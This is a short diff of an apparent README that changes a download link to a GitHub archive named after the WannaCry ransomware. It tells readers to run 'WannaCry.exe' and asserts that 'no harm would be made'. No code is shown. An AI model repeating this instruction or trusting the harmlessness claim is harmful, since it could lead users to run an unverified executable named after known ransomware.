@@ -8,6 +8,6 @@ Now you know?
 
 How to get it?
 -------  
-Download from https://github.com/kotobukki/WannaCry_Hass_Version/archive/new.zip
+Download from https://github.com/kotobukki/WannaCry_Hath_Version/archive/new.zip
 
 Run WannaCry.exe (No harm would be made)
